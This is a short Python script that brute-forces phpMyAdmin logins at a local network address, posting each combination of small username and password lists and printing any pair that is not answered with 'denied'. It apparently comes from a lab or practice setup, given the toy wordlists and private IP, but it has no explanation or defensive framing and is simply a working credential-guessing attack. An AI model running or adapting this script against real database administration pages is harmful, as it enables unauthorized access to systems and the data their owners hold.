import requests

users   = ['user' + str(n) for n in range(5)]
users.append('Abu')
users.append('wronguser')

passwords   = ['password' + str(n) for n in range(5)]
passwords.append('killer')
passwords.append('wrongpassword')

url = 'http://192.168.1.167/phpMyAdmin/index.php?token=e299005bfea4efe845bb1b69a7a6e97b'
url = url.split('?')[0]

#token   = requests.get(url).text.split('name="token"')[1].split('"')[1]

for user in users:
    for password in passwords:
        data = {
            'pma_username': user,
            'pma_password': password,
            #'token': token,
        }

        login = requests.post(url, data=data)
        if ('denied' not in login.text):
            print(user, password)
